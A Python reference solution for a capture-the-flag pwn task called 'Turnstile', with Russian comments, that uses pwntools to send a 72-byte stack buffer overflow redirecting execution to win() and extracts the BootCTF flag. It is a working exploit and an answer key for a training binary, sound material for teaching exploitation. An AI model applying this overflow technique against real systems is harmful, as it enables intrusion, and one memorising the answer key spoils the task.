#!/usr/bin/env python3
"""Эталонное решение «Турникета»: печатает флаг (одна строка).

Переполняет буфер check() и перезаписывает адрес возврата адресом win(),
который печатает флаг из окружения сервера.

Хост и порт — из окружения (TASK_HOST, TASK_PORT), по умолчанию 127.0.0.1:9001:
    TASK_HOST=10.0.0.5 python3 solution/solve.py

Смещение до адреса возврата: 64 байта буфера + 8 байт сохранённого rbp = 72.
Так как win() выводит флаг системным вызовом write(), выравнивание стека не
нарушается и достаточно прямого перехода на win() (без ret-гаджета).
"""

from __future__ import annotations

import os
import re
import sys

os.environ["PWNLIB_NOTERM"] = "1"
from pwn import ELF, context, p64, remote  # noqa: E402

context.log_level = "error"

HOST = os.environ.get("TASK_HOST", "127.0.0.1")
PORT = int(os.environ.get("TASK_PORT", "9001"))
TASK = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

OFFSET = 72


def main() -> None:
    elf = ELF(os.path.join(TASK, "public", "gatekeeper"))
    payload = b"A" * OFFSET + p64(elf.symbols["win"])

    io = remote(HOST, PORT)
    io.recvuntil(b":")
    io.sendline(payload)
    data = io.recvall(timeout=5)
    io.close()

    match = re.search(rb"BootCTF\{[^}]+\}", data)
    if not match:
        sys.exit(f"Флаг не найден в ответе: {data!r}")
    print(match.group().decode())


if __name__ == "__main__":
    main()
